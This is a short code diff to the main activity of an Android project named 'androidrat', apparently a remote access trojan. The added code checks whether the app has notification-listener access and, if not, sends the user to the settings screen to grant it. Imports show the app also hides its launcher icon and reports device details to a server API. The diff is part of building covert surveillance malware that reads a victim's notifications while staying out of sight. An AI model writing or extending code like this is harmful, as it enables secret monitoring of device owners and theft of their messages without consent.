@@ -5,12 +5,12 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.nqmgaming.androidrat.command.util.Functions.hideIcons
-import com.nqmgaming.androidrat.core.util.Constant
 import com.nqmgaming.androidrat.core.util.Constant.hideIcon
 import com.nqmgaming.androidrat.data.ApiService
 import com.nqmgaming.androidrat.data.dto.DeviceDto
@@ -35,6 +35,14 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         if (!arePermissionsGranted()) {
             ActivityCompat.requestPermissions(this, APP_PERMISSION, 0)
+        }
+
+        val notificationListenerString =
+            Settings.Secure.getString(this.contentResolver, "enabled_notification_listeners")
+
+        // Check notifications access permission
+        if (notificationListenerString == null || !notificationListenerString.contains(packageName)) {
+            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
         }
 
 
